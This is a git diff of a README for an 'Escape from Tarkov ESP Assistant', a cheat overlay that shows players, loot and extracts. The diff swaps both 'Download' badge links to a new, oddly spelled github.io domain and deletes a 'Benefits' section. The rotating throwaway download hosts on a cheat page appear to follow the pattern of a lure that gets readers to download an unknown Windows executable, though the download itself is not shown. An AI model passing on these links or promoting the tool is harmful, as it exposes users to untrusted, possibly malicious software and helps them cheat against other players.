@@ -1,7 +1,7 @@
 # 🎯 Escape from Tarkov — ESP Assistant (Setup Manual)
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download_Setup_Assistant-green?style=for-the-badge)](https://deraveappinfo01.github.io/.github/)
-[![Download Now](https://img.shields.io/badge/Download_Now-darkblue?style=for-the-badge&logo=windows)](https://deraveappinfo01.github.io/.github/)
+[![Download Setup Assistant](https://img.shields.io/badge/Download_Setup_Assistant-green?style=for-the-badge)](https://escafe1fromtarkov2llesp0.github.io/.github/)
+[![Download Now](https://img.shields.io/badge/Download_Now-darkblue?style=for-the-badge&logo=windows)](https://escafe1fromtarkov2llesp0.github.io/.github/)
 
 ---
 
@@ -46,15 +46,6 @@ Gain the ultimate tactical edge in **Escape from Tarkov** with a high-performanc
 📦 Locate valuable items across large maps  
 📍 Navigate to extracts without opening the map  
 🎯 Ambush enemies before they see you
-
----
-
-## 🏆 Benefits
-
-🔧 Full overlay customization (size, opacity, color)  
-💻 Runs in background without FPS drop  
-📊 Designed for all EFT editions (standard to Edge of Darkness)  
-🎯 Great for solo and squad raids alike
 
 ---
 
